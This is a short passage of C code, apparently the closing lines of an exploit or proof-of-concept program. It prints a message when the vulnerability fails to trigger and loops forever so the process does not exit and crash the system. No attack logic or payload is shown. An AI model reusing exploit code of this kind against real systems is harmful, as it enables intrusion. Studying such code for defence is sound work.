                printf("Failed to trigger vuln, try again!\n");
        }

// Can't exit, everything might crash
        while (1) 
                sleep(1000);

        return 0;
}
